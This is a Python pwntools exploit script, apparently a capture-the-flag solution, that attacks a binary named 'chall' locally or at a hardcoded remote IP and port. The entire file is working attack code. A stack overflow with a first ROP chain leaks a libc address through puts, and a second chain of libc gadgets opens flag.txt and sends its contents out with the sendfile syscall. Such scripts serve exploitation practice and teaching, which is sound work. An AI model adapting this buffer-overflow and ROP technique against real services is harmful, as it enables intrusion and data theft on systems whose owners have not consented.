#!/usr/bin/env python3

from pwn import *

PATH = "./chall"
LIBC_PATH = "./libc.so.6"
LD_PATH = "./ld-linux-x86-64.so.2"

exe = context.binary = ELF(PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
ldd = ELF(LD_PATH, checksec=False)

if args.REMOTE:
    HOST = "72.61.200.187"
    PORT = 10003
    p = remote(HOST, PORT)

else:
    p = process(PATH)
    if args.GDB:
        GDB_SCRIPT = \
"""
b *main+1047
c
"""
        gdb.attach(p, gdbscript=GDB_SCRIPT)

exe.rop = ROP(exe)
s = b'A' * (cyclic_find(0x616161616161616c, n=8) - 0x08)
s += p64(exe.bss(0x800))
s += p64(exe.rop.rdi.address)+ p64(exe.got.puts)
s += p64(exe.sym['main'] + 997)

p.sendlineafter(b'what CAN you do? ', s)

libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
print(f'libc.address: {hex(libc.address)}')
libc.rop = ROP(libc)

# 0x00000000000dd237: pop rax; ret;
# 0x00000000000981ad: pop rdx; leave; ret; 
# 0x00000000000fcf3c: pop rsi; or bh, dh; ret;
# 0x000000000011bbb4: mov r10, rcx; mov eax, 0x28; syscall; cmp rax, -0x1000; ja 0x11bbd0; ret;

pop_rax = libc.address + 0x00000000000dd237
pop_rdx_leave = libc.address + 0x00000000000981ad
pop_rsi = libc.address + 0x00000000000fcf3c
mov_r10_rcx_syscall_sendfile = libc.address + 0x000000000011bbb4

flag_str = 0x4048c0

s = b'\x00' * (cyclic_find(0x616161616161616c, n=8) - 8)
s += p64(0x404880)

s += p64(exe.rop.rdi.address) + p64(flag_str)
s += p64(pop_rsi) + p64(0)
s += p64(libc.sym['open'])

s += p64(exe.rop.rdi.address) + p64(1)
s += p64(pop_rsi) + p64(3)
s += p64(pop_rdx_leave) + p64(0) + p64(0)
s += p64(libc.rop.rcx.address) + p64(0x40)
s += p64(mov_r10_rcx_syscall_sendfile)

s += p64(exe.rop.rdi.address) + p64(0)
s += p64(libc.sym['exit'])
s += b'\x00' * (0xf0 - len(s))
s += b'flag.txt'.ljust(0x10, b'\x00')

p.sendlineafter(b'what CAN you do? ', s)

p.interactive()